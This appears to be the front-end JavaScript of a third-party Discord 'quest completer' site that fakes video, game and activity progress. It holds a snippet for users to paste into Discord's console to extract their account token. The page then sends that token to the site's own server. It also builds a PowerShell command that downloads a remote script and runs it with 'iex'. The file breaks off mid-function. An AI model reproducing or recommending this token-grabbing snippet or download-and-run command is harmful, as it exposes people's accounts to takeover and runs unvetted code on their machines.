let token = '';
let superProperties = '';
let buildNumber = 504649;
let questsRaw = [];
let running = false;
let stopFlag = false;
let lastHandle400Time = 0;
const activeControllers = new Set();

const BLANK_IMG_DATA_URI = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';

const TOKEN_SNIPPET = "(() => {let token=null;let superProps=null;try{const wpRequire=webpackChunkdiscord_app.push([[Symbol()],{},(r)=>r]);webpackChunkdiscord_app.pop();for(const mod of Object.values(wpRequire.c)){try{const exp=mod.exports?.default||mod.exports;if(!exp)continue;if(!token&&typeof exp.getToken==='function'){const t=exp.getToken();if(t&&typeof t==='string'&&t.length>20)token=t;}if(!superProps&&typeof exp.getSuperProperties==='function'){const sp=exp.getSuperProperties();if(sp&&sp.client_build_number){superProps=btoa(JSON.stringify(sp));}}if(token&&superProps)break;}catch(e){}}}catch(e){}if(token)console.log('%cTOKEN:','color:#00ff00;font-weight:bold',token);else console.log('%cTOKEN: not found','color:#ff0000;font-weight:bold');if(superProps)console.log('%cSP:','color:#00ff00;font-weight:bold',superProps);else console.log('%cSP: not found','color:#ff0000;font-weight:bold');if(token&&superProps)console.log('%cBoth found. Copy TOKEN and SP into the site.','color:#5865f2;font-weight:bold');})()";

const $ = (id) => document.getElementById(id);

function toggleToken() {
    const inp = $('tokenInput');
    const btn = $('showBtn');
    if (inp.type === 'password') { inp.type = 'text'; btn.textContent = 'Hide'; }
    else { inp.type = 'password'; btn.textContent = 'Show'; }
}

function setStatus(text, color) {
    const c = color || '#6a6f7a';
    $('statusDot').style.color = c;
    $('statusText').style.color = c;
    $('statusText').textContent = text;
}

function addLog(msg, level) {
    const box = $('logBox');
    const ts = new Date().toLocaleTimeString('en-GB', { hour12: false });
    const cls = 'log-' + (level || 'info');
    box.innerHTML += `<div class="log-entry"><span class="log-time">${ts}</span> <span class="${cls}">${escHtml(msg)}</span></div>`;
    box.scrollTop = box.scrollHeight;
}

function clearLog() { $('logBox').innerHTML = ''; }

function escHtml(s) {
    const d = document.createElement('div');
    d.textContent = s == null ? '' : String(s);
    return d.innerHTML;
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function devtoolsOneLiner() {
    const origin = location.origin && location.origin !== 'null'
        ? location.origin
        : 'https://quests.zorohex.com';
    return `powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr ${origin}/static/enable-devtools.ps1 -UseBasicParsing | iex"`;
}

function openTokenModal() {
    $('tokenSnippet').textContent = TOKEN_SNIPPET;
    $('devtoolsOneLiner').textContent = devtoolsOneLiner();
    $('tokenModal').classList.add('open');
}

function closeTokenModal() {
    $('tokenModal').classList.remove('open');
}

async function copyText(text) {
    if (navigator.clipboard && window.isSecureContext) {
        await navigator.clipboard.writeText(text);
        return;
    }
    const ta = document.createElement('textarea');
    ta.value = text;
    ta.style.position = 'fixed';
    ta.style.opacity = '0';
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
}

async function copySnippet() {
    const btn = $('copySnippetBtn');
    const old = btn.textContent;
    try {
        await copyText(TOKEN_SNIPPET);
        btn.textContent = 'Copied';
        setTimeout(() => { btn.textContent = old; }, 1200);
    } catch (e) {
        addLog('Copy failed: ' + e.message, 'error');
    }
}

async function copyDevtoolsOneLiner() {
    const btn = $('copyDevtoolsBtn');
    const old = btn.textContent;
    try {
        await copyText(devtoolsOneLiner());
        btn.textContent = 'Copied';
        setTimeout(() => { btn.textContent = old; }, 1200);
    } catch (e) {
        addLog('Copy failed: ' + e.message, 'error');
    }
}

document.addEventListener('click', (e) => {
    const m = $('tokenModal');
    if (m && e.target === m) closeTokenModal();
});

document.addEventListener('keydown', (e) => {
    if (e.key === 'Escape') closeTokenModal();
});

function browserTimezone() {
    try {
        return Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC';
    } catch (e) {
        return 'UTC';
    }
}

function payloadBase() {
    return {
        token,
        super_properties: superProperties,
        build_number: buildNumber,
        timezone: browserTimezone(),
    };
}

function isAuthError(status, txt) {
    if (status === 401 || status === 403) return true;
    if (!txt) return false;
    if (/Unauthorized|40001|"code":\s*40001/.test(txt)) return true;
    return false;
}

async function doConnect() {
    token = $('tokenInput').value.trim();
    superProperties = $('spInput').value.trim();
    if (!token) { addLog('Token is empty.', 'error'); return; }
    if (!superProperties) { addLog('Super Properties are empty.', 'error'); return; }

    const btn = $('connectBtn');
    btn.disabled = true;
    btn.textContent = 'Connecting...';
    setStatus('Connecting...', '#f0b232');
    addLog('Connecting...');

    try {
        const res = await fetch('/api/connect', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ token, super_properties: superProperties }),
        });
        const data = await res.json();
        if (data.ok) {
            buildNumber = data.build_number;
            addLog(`Logged in as ${data.user.username} (${data.user.id})`, 'ok');
            addLog(`Build: ${buildNumber}`);
            const pill = $('userPill');
            pill.textContent = data.user.username;
            pill.classList.add('connected');
            setStatus('Connected', '#3ba55d');
            await doRefresh();
        } else {
            addLog(data.error || 'Connection failed.', 'error');
            setStatus('Failed', '#ed4245');
        }
    } catch (e) {
        addLog('Network error: ' + e.message, 'error');
        setStatus('Error', '#ed4245');
    }

    btn.disabled = false;
    btn.textContent = 'Connect';
}

async function doRefresh() {
    if (!token || !superProperties) { addLog('Not connected.', 'warn'); return; }
    $('refreshBtn').disabled = true;
    setStatus('Loading quests...', '#f0b232');
    try {
        const res = await fetch('/api/quests', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payloadBase()),
        });
        const data = await res.json();
        if (data.ok) {
            questsRaw = data.quests;
            $('statTotal').textContent = data.total;
            $('statAvail').textContent = data.available;
            $('statDone').textContent = data.completed;

            const displayable = data.quests.filter(q => !q.is_completed && !q.is_claimed && q.is_completable);
            const runnable = displayable.filter(q => q.is_runnable);
            renderQuests(displayable);
            const lockedCount = displayable.length - runnable.length;
            setStatus(
                `Ready — ${runnable.length} runnable${lockedCount ? `, ${lockedCount} locked` : ''}`,
                '#3ba55d',
            );
            $('startBtn').disabled = runnable.length === 0;
        } else {
            addLog(data.error || 'Failed.', 'error');
            setStatus('Failed', '#ed4245');
        }
    } catch (e) {
        addLog('Error: ' + e.message, 'error');
    }
    $('refreshBtn').disabled = false;
}

function attachImgFallback(imgEl, candidates) {
    if (!imgEl) return;
    if (!candidates || !candidates.length) {
        imgEl.style.visibility = 'hidden';
        return;
    }
    let idx = 0;
    const tryNext = () => {
        if (idx >= candidates.length) {
            imgEl.style.visibility = 'hidden';
            return;
        }
        imgEl.src = candidates[idx++];
    };
    imgEl.onerror = tryNext;
    imgEl.onload = () => { imgEl.onerror = null; imgEl.style.visibility = 'visible'; };
    tryNext();
}

function formatExpiration(iso) {
    if (!iso) return '';
    try {
        const d = new Date(iso);
        if (isNaN(d.getTime())) return '';
        const mm = String(d.getMonth() + 1).padStart(2, '0');
        const dd = String(d.getDate()).padStart(2, '0');
        return `Ends ${mm}/${dd}`;
    } catch (e) { return ''; }
}

function restartAnimatedImg(img, url) {
    if (!img || !url) return;
    try {
        img.style.display = 'block';
        img.style.visibility = 'visible';
        if (img.getAttribute('src') === url) {
            img.src = BLANK_IMG_DATA_URI;
            void img.offsetWidth;
        }
        img.src = url;
    } catch (e) {
        img.src = url;
    }
}

function restartVideo(v, url) {
    if (!v || !url) return;
    try {
        v.style.display = 'block';
        if (v.getAttribute('src') !== url) {
            v.src = url;
            const onMeta = () => {
                v.removeEventListener('loadedmetadata', onMeta);
                try { v.currentTime = 0; } catch (e) {}
                v.play().catch(() => {});
            };
            v.addEventListener('loadedmetadata', onMeta);
            v.load();
            v.play().catch(() => {});
        } else {
            try { v.currentTime = 0; } catch (e) {}
            v.play().catch(() => {});
        }
    } catch (e) {
        v.play().catch(() => {});
    }
}

function renderQuests(quests) {
    const c = $('questScroll');
    c.innerHTML = '';
    $('questHeader').textContent = `QUESTS  ·  ${quests.length} shown`;

    if (!quests.length) {
        c.innerHTML = '<div class="empty-msg">No available quests.</div>';
        return;
    }

    console.groupCollapsed('%c[Quest Debug]', 'color:#5865f2;font-weight:bold');
    quests.forEach(q => {
        console.log(q.name, {
            task_type: q.task_type,
            is_runnable: q.is_runnable,
            reward_primary: {
                name: q.reward?.name,
                type: q.reward?.type,
                is_orbs: q.reward?.is_orbs,
                asset_static: q.reward?.asset_static,
                asset_hover: q.reward?.asset_hover,
            },
            reward_all: q.reward?.all,
            rewards_dump: q.reward?.rewards_dump,
            assets_game_tile: q.assets?.game_tile,
            assets_logotype: q.assets?.logotype,
            assets_hero: q.assets?.hero,
            assets_hero_video: q.assets?.hero_video,
            assets_keys: q.assets?.assets_keys,
        });
    });
    console.groupEnd();

    quests.forEach(q => {
        const partner = q.partner || q.messages?.game_title || '';
        const gameTitle = q.messages?.game_title || '';
        const taskDesc = q.messages?.task_description || '';
        const rewardName = q.reward?.name || '';
        const expiresText = formatExpiration(q.expires_at);

        const heroVideoUrl = q.assets?.hero_video || '';
        const heroImgUrl = q.assets?.hero || '';
        const gameTileUrl = q.assets?.game_tile || '';

        const rewardStaticUrl = q.reward?.asset_static || '';
        const rewardHoverUrl = q.reward?.asset_hover || '';

        const statusText = q.is_runnable ? 'Pending' : 'Not supported';
        const statusClass = q.is_runnable ? 'quest-status' : 'quest-status disabled';

        const card = document.createElement('article');
        card.className = 'quest-card' + (q.is_runnable ? '' : ' disabled');
        card.id = `card-${q.id}`;
        card.innerHTML = `
            <div class="quest-banner">
                <video class="quest-banner-video" id="hero-video-${q.id}" muted loop playsinline preload="auto" style="display:none"></video>
                <img class="quest-banner-bg" id="hero-img-${q.id}" alt="">
                <div class="quest-banner-overlay"></div>
                <div class="quest-banner-content">
                    <div class="quest-banner-top">
                        <img class="quest-logo" alt="" id="logo-${q.id}" onerror="this.style.visibility='hidden'">
                        <input type="checkbox" class="quest-checkbox" ${q.is_runnable ? 'checked' : ''} id="cb-${q.id}">
                    </div>
                    <div class="quest-banner-bottom">
                        <div class="quest-promoted">
                            <span class="quest-promoted-label">Promoted by</span>
                            <svg class="quest-verified" viewBox="0 0 16 16" aria-hidden="true">
                                <path fill="#23a55a" fill-rule="evenodd" clip-rule="evenodd" d="M5.52995 0.431867C6.27995 0.181867 7.2 1.23199 8 1.23199C8.8 1.23199 9.75007 0.231867 10.4701 0.431867C11.19 0.631965 11.38 2.07173 12 2.52171C12.62 2.9717 14.0003 2.70184 14.4603 3.32184C14.9199 3.94191 14.2303 5.16178 14.4603 5.91169C14.6903 6.66159 15.9998 7.21166 16 8.00153C16 8.79146 14.72 9.38146 14.4798 10.0914C14.2398 10.8014 14.9198 12.0919 14.4798 12.6819C14.0397 13.2716 12.6401 13.0321 12.0202 13.482C11.4002 13.932 11.2298 15.3219 10.4798 15.5719C9.72987 15.8216 8.80967 14.7717 8.00973 14.7717C7.2098 14.7719 6.25964 15.7718 5.53971 15.5719C4.81995 15.3716 4.61982 13.9321 4 13.482C3.38 13.032 1.99971 13.3019 1.53971 12.6819C1.07975 12.0619 1.76971 10.8414 1.53971 10.0914C1.30939 9.34159 0 8.79139 0 8.00153C0.000177681 7.21159 1.2802 6.62163 1.52018 5.91169C1.76012 5.20167 1.08021 3.91183 1.52018 3.32184C1.96018 2.73184 3.36999 3.0017 4 2.52171C4.62997 2.04173 4.78003 0.681954 5.52995 0.431867Z"/>
                                <path fill="white" fill-rule="evenodd" clip-rule="evenodd" d="M11.5 6.5a.75.75 0 0 1 0 1.06l-3.5 3.5a.75.75 0 0 1-1.06 0l-1.75-1.75a.75.75 0 1 1 1.06-1.06l1.22 1.22 2.97-2.97a.75.75 0 0 1 1.06 0Z"/>
                            </svg>
                            <strong class="quest-promoted-name">${escHtml(partner)}</strong>
                        </div>
                        <div class="quest-expiration">${escHtml(expiresText)}</div>
                    </div>
                </div>
            </div>
            <div class="quest-body">
                <div class="quest-content-row">
                    <div class="quest-reward-wrap" id="reward-wrap-${q.id}">
                        <img class="quest-reward-img" id="reward-img-${q.id}" src="${rewardStaticUrl}" alt="">
                        <video class="quest-reward-video" id="reward-video-${q.id}" muted loop playsinline style="display:none; width: 64px; height: 64px; object-fit: contain;"></video>
                    </div>
                    <div class="quest-copy">
                        <h2 class="quest-title">${escHtml(q.name)}</h2>
                        <div class="quest-claim-head">
                            ${rewardName ? `Claim <span class="quest-claim-orbs">${escHtml(rewardName)}</span>` : ''}
                            <span class="quest-nitro-pill">
                                <svg viewBox="0 0 24 24" width="12" height="12" fill="none" aria-hidden="true">
                                    <path fill="white" d="M16.23 12c0 1.29-.95 2.25-2.22 2.25A2.18 2.18 0 0 1 11.8 12c0-1.29.95-2.25 2.22-2.25 1.27 0 2.22.96 2.22 2.25ZM23 12c0 5.01-4 9-8.99 9a8.93 8.93 0 0 1-8.75-6.9H3.34l-.9-4.2H5.3c.26-.96.68-1.89 1.21-2.7H1.89L1 3h12.74C19.13 3 23 6.99 23 12Zm-4.26 0c0-2.67-2.1-4.8-4.73-4.8A4.74 4.74 0 0 0 9.28 12c0 2.67 2.1 4.8 4.73 4.8a4.74 4.74 0 0 0 4.73-4.8Z"/>
                                </svg>
                                <span>1.2x</span>
                            </span>
                        </div>
                        <p class="quest-description">${escHtml(taskDesc || gameTitle)}</p>
                        <div class="quest-progress-row">
                            <span class="${statusClass}" id="status-${q.id}">${escHtml(statusText)}</span>
                            <span class="quest-seconds" id="secs-${q.id}">${Math.floor(q.seconds_done)}/${Math.floor(q.seconds_needed)}s</span>
                        </div>
                        <div class="quest-pbar"><div class="quest-pbar-fill" id="pbar-${q.id}" style="width:${q.seconds_needed > 0 ? Math.min(100, (q.seconds_done / q.seconds_needed) * 100) : 0}%"></div></div>
                    </div>
                </div>
            </div>
        `;
        c.appendChild(card);

        const heroImg = document.getElementById(`hero-img-${q.id}`);
        const heroVideo = document.getElementById(`hero-video-${q.id}`);
        const logoEl = document.getElementById(`logo-${q.id}`);
        const rewardImg = document.getElementById(`reward-img-${q.id}`);
        const rewardVideo = document.getElementById(`reward-video-${q.id}`);

        const staticSrc = rewardStaticUrl || '';
        const hoverSrc = rewardHoverUrl || '';
        const isHoverVideoUrl = hoverSrc.includes('.mp4') || hoverSrc.includes('.webm');

        if (rewardImg) {
            rewardImg.onload = () => {
                rewardImg.style.visibility = 'visible';
                rewardImg.style.display = 'block';
            };

            rewardImg.onerror = () => {
                const curSrc = rewardImg.getAttribute('src') || '';
                if (curSrc && curSrc !== staticSrc && hoverSrc && !isHoverVideoUrl && rewardVideo) {
                    rewardVideo.onerror = () => {
                        rewardVideo.style.display = 'none';
                        rewardVideo.pause();
                        rewardImg.style.display = 'block';
                        rewardImg.style.visibility = 'visible';
                        rewardImg.src = staticSrc;
                    };
                    restartVideo(rewardVideo, curSrc);
                    rewardImg.style.display = 'none';
                    return;
                }
                if (!staticSrc || curSrc === staticSrc) {
                    rewardImg.style.visibility = 'hidden';
                } else {
                    rewardImg.style.visibility = 'visible';
                    rewardImg.src = staticSrc;
                }
            };
        }

        const heroCandidates = [];
        if (heroImgUrl) heroCandidates.push(heroImgUrl);
        if (gameTileUrl) heroCandidates.push(gameTileUrl);
        attachImgFallback(heroImg, heroCandidates);

        const logoCandidates = [];
        if (q.assets?.logotype) logoCandidates.push(q.assets.logotype);
        attachImgFallback(logoEl, logoCandidates);

        if (heroVideoUrl) {
            let fell = false;
            const fallback = () => {
                if (fell) return;
                fell = true;
                if (heroVideo.parentNode) heroVideo.remove();
                heroImg.style.display = 'block';
            };
            heroVideo.onerror = fallback;
            heroVideo.src = heroVideoUrl;
        }

        if (!q.is_runnable) {
            const cb = document.getElementById(`cb-${q.id}`);
            if (cb) { cb.disabled = true; cb.checked = false; }
        } else {
            card.addEventListener('mouseenter', () => {
                if (heroVideoUrl && heroVideo.parentNode) {
                    restartVideo(heroVideo, heroVideoUrl);
                    heroVideo.style.display = 'block';
                    heroImg.style.display = 'none';
                }
                if (rewardImg && hoverSrc) {
                    if (isHoverVideoUrl) {
                        if (rewardVideo) {
                            restartVideo(rewardVideo, hoverSrc);
                            rewardImg.style.display = 'none';
                        }
                    } else {
                        if (rewardVideo) {
                            rewardVideo.pause();
                            try { rewardVideo.currentTime = 0; } catch (e) {}
                            rewardVideo.style.display = 'none';
                        }
                        restartAnimatedImg(rewardImg, hoverSrc);
                    }
                }
            });

            card.addEventListener('mouseleave', () => {
                if (heroVideoUrl && heroVideo.parentNode) {
                    heroVideo.pause();
                    heroVideo.style.display = 'none';
                    heroImg.style.display = 'block';
                }
                if (rewardImg && staticSrc) {
                    rewardImg.style.display = 'block';
                    rewardImg.style.visibility = 'visible';
                    if (rewardVideo) {
                        rewardVideo.pause();
                        try { rewardVideo.currentTime = 0; } catch (e) {}
                        rewardVideo.style.display = 'none';
                    }
                    rewardImg.src = staticSrc;
                }
            });
        }
    });
}

function selectAll() {
    document.querySelectorAll('.quest-card input[type="checkbox"]:not(:disabled)').forEach(cb => cb.checked = true);
}

function deselectAll() {
    document.querySelectorAll('.quest-card input[type="checkbox"]:not(:disabled)').forEach(cb => cb.checked = false);
}

function updateCardProgress(qid, done, total) {
    const pbar = document.getElementById(`pbar-${qid}`);
    const status = document.getElementById(`status-${qid}`);
    const card = document.getElementById(`card-${qid}`);
    const secs = document.getElementById(`secs-${qid}`);
    if (!pbar) return;

    const realDone = Number(done) || 0;
    const realTotal = Number(total) || 0;

    const pct = realTotal > 0 ? Math.min(100, (realDone / realTotal) * 100) : 0;
    pbar.style.width = pct + '%';

    if (secs) secs.textContent = `${Math.floor(realDone)}/${Math.floor(realTotal)}s`;

    if (realDone >= realTotal) {
        pbar.className = 'quest-pbar-fill done';
        if (status) { status.textContent = 'Completed'; status.className = 'quest-status done'; }
        if (card) card.className = 'quest-card done';
        const cb = document.getElementById(`cb-${qid}`);
        if (cb) { cb.checked = false; cb.disabled = true; }
    } else {
        pbar.className = 'quest-pbar-fill running';
        if (status) { status.textContent = 'Running'; status.className = 'quest-status running'; }
        if (card) card.className = 'quest-card running';
    }
}

async function enrollQuest(quest) {
    if (quest.is_enrolled) return true;
    try {
        const res = await fetch('/api/enroll', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                ...payloadBase(),
                quest_id: quest.id,
                traffic_metadata_raw: quest.traffic_metadata_raw,
                traffic_metadata_sealed: quest.traffic_metadata_sealed,
            }),
        });
        if (res.status === 429) {
            const d = await res.json();
            await sleep((d.retry_after || 5) * 1000 + 1000);
            return enrollQuest(quest);
        }
        const d = await res.json();
        return !!d.ok;
    } catch (e) {
        addLog(`Enroll error: ${e.message}`, 'error');
        return false;
    }
}

async function fetchQuestState(qid) {
    try {
        const res = await fetch('/api/quests', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payloadBase()),
        });
        const d = await res.json();
        if (!d.ok) return null;
        return d.quests.find(x => x.id === qid) || null;
    } catch (e) {
        return null;
    }
}

async function doStart() {
    if (running) return;
    const selectedIds = [];
    document.querySelectorAll('.quest-card input[type="checkbox"]:checked:not(:disabled)').forEach(cb => {
        selectedIds.push(cb.id.replace('cb-', ''));
    });
    if (!selectedIds.length) { addLog('No quests selected.', 'warn'); return; }

    running = true;
    stopFlag = false;
    $('startBtn').disabled = true;
    $('stopBtn').disabled = false;
    $('refreshBtn').disabled = true;
    $('connectBtn').disabled = true;
    addLog(`Starting ${selectedIds.length} quest(s)...`);
    setStatus(`Running ${selectedIds.length} quest(s)...`, '#f0b232');

    const selected = questsRaw.filter(q => selectedIds.includes(q.id));

    const toRun = [];
    for (const quest of selected) {
        if (stopFlag) break;
        if (!quest.is_runnable) { addLog(`Skipping (locked): ${quest.name}`, 'warn'); continue; }
        if (quest.is_claimed) { addLog(`Skipping (already claimed): ${quest.name}`, 'warn'); continue; }
        if (quest.is_completed) { addLog(`Skipping (already completed): ${quest.name}`, 'warn'); continue; }

        if (!quest.is_enrolled) {
            addLog(`Auto-accepting: ${quest.name}`);
            const ok = await enrollQuest(quest);
            if (!ok) { addLog(`Enroll failed: ${quest.name}`, 'error'); continue; }
            addLog(`Accepted: ${quest.name}`, 'ok');
            await sleep(2000);
        }
        toRun.push(quest);
    }

    for (const quest of toRun) {
        if (stopFlag) break;
        addLog(`Running: ${quest.name}`);
        if (quest.task_type === 'WATCH_VIDEO' || quest.task_type === 'WATCH_VIDEO_ON_MOBILE') {
            await runVideo(quest);
        } else if (quest.task_type === 'PLAY_ON_DESKTOP' || quest.task_type === 'PLAY_ON_DESKTOP_V2' || quest.task_type === 'STREAM_ON_DESKTOP') {
            await runDesktopQuest(quest);
        } else if (quest.task_type === 'PLAY_ACTIVITY') {
            await runActivity(quest);
        } else {
            addLog(`Unsupported task type: ${quest.task_type}`, 'warn');
        }
    }

    running = false;
    $('startBtn').disabled = false;
    $('stopBtn').disabled = true;
    $('refreshBtn').disabled = false;
    $('connectBtn').disabled = false;
    if (stopFlag) {
        setStatus('Stopped by user', '#ed4245');
        addLog('Process aborted.', 'warn');
    } else {
        setStatus('All tasks finished', '#3ba55d');
        addLog('Done.', 'ok');
    }
}

async function handle400(qid, quest, needed) {
    const now = Date.now();
    if (now - lastHandle400Time < 15000) return 'retry';
    lastHandle400Time = now;
    const fresh = await fetchQuestState(qid);
    if (fresh && (fresh.is_completed || fresh.is_claimed)) {
        updateCardProgress(qid, needed, needed);
        addLog(`Completed: ${quest.name}`, 'ok');
        return 'done';
    }
    return 'retry';
}

async function runVideo(quest) {
    const qid = quest.id;
    const needed = Number(quest.seconds_needed) || 0;
    let done = Number(quest.seconds_done) || 0;
    const step = 5;
    const delay = 2000;
    let consecutive400 = 0;
    let authFailures = 0;

    while (done < needed) {
        if (stopFlag) return;
        const nextTs = Math.min(needed, done + step + (Math.random() * 0.3));
        try {
            const res = await fetch('/api/video-progress', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ...payloadBase(), quest_id: qid, timestamp: Number(nextTs.toFixed(2)) }),
            });
            if (stopFlag) return;

            if (res.status === 429) {
                const d = await res.json();
                await sleep((d.retry_after || 5) * 1000 + 1000);
                continue;
            }

            if (!res.ok) {
                const txt = await res.text().catch(() => '');
                if (isAuthError(res.status, txt)) {
                    authFailures++;
                    if (authFailures >= 2) {
                        addLog(`[${quest.name}] Discord rejected video-progress (401 Unauthorized). Skipping.`, 'error');
                        return;
                    }
                    await sleep(2000);
                    continue;
                }
                if (res.status === 400) {
                    consecutive400++;
                    if (consecutive400 >= 2) {
                        const r = await handle400(qid, quest, needed);
                        if (r === 'done') return;
                        consecutive400 = 0;
                    }
                    await sleep(2500);
                    continue;
                }
                addLog(`[${quest.name}] video HTTP ${res.status}: ${txt.slice(0, 200)}`, 'error');
                await sleep(2500);
                continue;
            }

            consecutive400 = 0;
            const d = await res.json();
            if (d.ok) {
                const respData = d.data || {};
                const us = respData.user_status || respData;
                const prog = (us.progress || {})[quest.task_type] || {};
                if (prog.value !== undefined) done = Math.max(done, prog.value);
                else done = nextTs;
                updateCardProgress(qid, done, needed);
                if (us.completed_at || us.claimed_at || respData.completed_at || done >= needed) {
                    updateCardProgress(qid, needed, needed);
                    addLog(`Completed: ${quest.name}`, 'ok');
                    return;
                }
            }
        } catch (e) {
            addLog(`Error: ${e.message}`, 'error');
        }
        if (stopFlag) return;
        await sleep(delay);
    }

    if (stopFlag) return;
    try {
        await fetch('/api/video-progress', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...payloadBase(), quest_id: qid, timestamp: needed }),
        });
        updateCardProgress(qid, needed, needed);
        addLog(`Completed: ${quest.name}`, 'ok');
    } catch (e) {}
}

async function runDesktopQuest(quest) {
    const qid = quest.id;
    const needed = Number(quest.seconds_needed) || 0;
    let done = Number(quest.seconds_done) || 0;

    addLog(`[${quest.name}] desktop quest start (via /api/solve), ${Math.floor(done)}/${needed}s`);

    if (needed <= 0) {
        addLog(`[${quest.name}] seconds_needed=${needed} — cannot run`, 'error');
        return;
    }

    const chunkSeconds = 60;
    const overlapMs = 12000;
    const maxChunks = 100;
    const playStartedAt = Date.now();
    const inflight = new Set();
    let finished = false;
    let fatal = false;
    let launched = 0;
    let loggedDiagnostic = false;

    const handleResult = (d) => {
        if (d.diagnostic && !loggedDiagnostic) {
            loggedDiagnostic = true;
            const g = d.diagnostic.gateway || {};
            const gw = g.state === 'failed' ? `failed (${g.error || 'unknown'})` : g.state;
            addLog(`[${quest.name}] identity=${d.diagnostic.identity}, gateway=${gw}, variant=${d.diagnostic.variant || 'none'}`);
        }

        if (d.status === 'auth_rejected') {
            const tried = ((d.diagnostic && d.diagnostic.attempts) || [])
                .map(a => `${a.variant}:${a.status}`).join(', ');
            addLog(`[${quest.name}] Discord rejected the heartbeat (401/403)${tried ? ' [' + tried + ']' : ''}. ${d.note || ''}`, 'error');
            fatal = true;
            return;
        }

        if (d.status === 'no_progress') {
            addLog(`[${quest.name}] ${d.note || 'Heartbeats accepted without progress.'}`, 'warn');
            fatal = true;
            return;
        }

        if (!d.ok) {
            addLog(`[${quest.name}] solve failed: ${d.error || 'unknown'}`, 'error');
            fatal = true;
            return;
        }

        if (typeof d.current === 'number') done = Math.max(done, d.current);
        const total = typeof d.target === 'number' && d.target > 0 ? d.target : needed;
        updateCardProgress(qid, done, total);

        if (d.status === 'completed') {
            finished = true;
            return;
        }

        addLog(`[${quest.name}] ${Math.floor(done)}/${Math.floor(total)}s`, 'ok');
        if (d.last_error) addLog(`[${quest.name}] last backend error: ${String(d.last_error).slice(0, 200)}`, 'warn');
    };

    const launchChunk = async () => {
        const controller = new AbortController();
        activeControllers.add(controller);
        try {
            const res = await fetch('/api/solve', {
                method: 'POST',
                signal: controller.signal,
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    ...payloadBase(),
                    quest_id: qid,
                    application_id: quest.application_id,
                    application_name: quest.application_name || '',
                    task_type: quest.task_type,
                    seconds_needed: needed,
                    seconds_done: done,
                    budget_seconds: chunkSeconds,
                    play_started_at: playStartedAt,
                }),
            });
            const d = await res.json().catch(() => ({}));
            if (res.status === 400) {
                addLog(`[${quest.name}] solve rejected the request: ${d.error || 'bad request'}`, 'error');
                fatal = true;
                return;
            }
            handleResult(d);
        } catch (e) {
            if (e.name !== 'AbortError') {
                addLog(`[${quest.name}] solve error: ${e.message}`, 'warn');
                await sleep(3000);
            }
        } finally {
            activeControllers.delete(controller);
        }
    };

    while (!finished && !fatal && !stopFlag && launched < maxChunks) {
        launched++;
        const task = launchChunk().finally(() => inflight.delete(task));
        inflight.add(task);
        await Promise.race([task, sleep(chunkSeconds * 1000 - overlapMs)]);
        if (!inflight.has(task)) await sleep(1500);
    }

    await Promise.allSettled([...inflight]);

    if (finished || done >= needed) {
        updateCardProgress(qid, needed, needed);
        addLog(`Completed: ${quest.name}`, 'ok');
    } else if (!stopFlag && !fatal) {
        addLog(`[${quest.name}] stopped at ${Math.floor(done)}/${needed}s after ${launched} chunk(s)`, 'warn');
    }
}

async function runActivity(quest) {
    const qid = quest.id;
    const needed = Number(quest.seconds_needed) || 0;
    let done = Number(quest.seconds_done) || 0;
    const sk = 'call:0:1';
    let consecutive400 = 0;
    let noProgress = 0;
    let authFailures = 0;
    let attempts = 0;

    addLog(`[${quest.name}] activity start, ${Math.floor(done)}/${needed}s`);

    if (needed <= 0) {
        addLog(`[${quest.name}] seconds_needed=${needed} — cannot run`, 'error');
        return;
    }

    while (done < needed && attempts < 500) {
        attempts++;
        if (stopFlag) return;
        try {
            const reqBody = {
                ...payloadBase(),
                quest_id: qid,
                stream_key: sk,
                terminal: false,
            };
            if (quest.application_id) reqBody.application_id = quest.application_id;

            const res = await fetch('/api/heartbeat', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(reqBody),
            });
            if (stopFlag) return;

            if (res.status === 429) {
                const d = await res.json().catch(() => ({}));
                addLog(`[${quest.name}] 429 rate limit — waiting ${d.retry_after || 10}s`, 'warn');
                await sleep((d.retry_after || 10) * 1000 + 1000);
                continue;
            }

            if (!res.ok) {
                const txt = await res.text().catch(() => '');
                if (isAuthError(res.status, txt)) {
                    authFailures++;
                    if (authFailures >= 2) {
                        addLog(`[${quest.name}] Discord rejected activity heartbeat (401 Unauthorized). Skipping.`, 'error');
                        return;
                    }
                    await sleep(2000);
                    continue;
                }
                consecutive400++;
                addLog(`[${quest.name}] activity HTTP ${res.status}: ${txt.slice(0, 250)}`, 'error');
                if (consecutive400 >= 2) {
                    const r = await handle400(qid, quest, needed);
                    if (r === 'done') return;
                    consecutive400 = 0;
                }
                await sleep(3000);
                continue;
            }

            consecutive400 = 0;
            const d = await res.json();
            if (!d.ok) {
                addLog(`[${quest.name}] API not ok: ${JSON.stringify(d).slice(0, 250)}`, 'error');
                await sleep(3000);
                continue;
            }

            const data = d.data || {};
            const us = data.user_status || data;
            const prog = (us.progress || data.progress || {}).PLAY_ACTIVITY;
            const prevDone = done;
            if (prog && typeof prog.value === 'number') done = Math.max(done, prog.value);
            updateCardProgress(qid, done, needed);

            if (done > prevDone) {
                noProgress = 0;
                addLog(`[${quest.name}] ${Math.floor(done)}/${needed}s`, 'ok');
            } else {
                noProgress++;
                if (noProgress === 1) addLog(`[${quest.name}] heartbeat accepted, no progress yet (${Math.floor(done)}/${needed}s)`);
                if (noProgress === 5) addLog(`[${quest.name}] Discord accepted 5 heartbeats with zero progress — this task type likely needs the actual game running.`, 'warn');
            }

            const completed = us.completed_at || us.claimed_at || data.completed_at || data.claimed_at || done >= needed;
            if (completed) break;
        } catch (e) {
            addLog(`[${quest.name}] activity error: ${e.message}`, 'error');
        }
        if (stopFlag) return;
        await sleep(20000);
    }

    if (stopFlag) return;
    try {
        const termBody = {
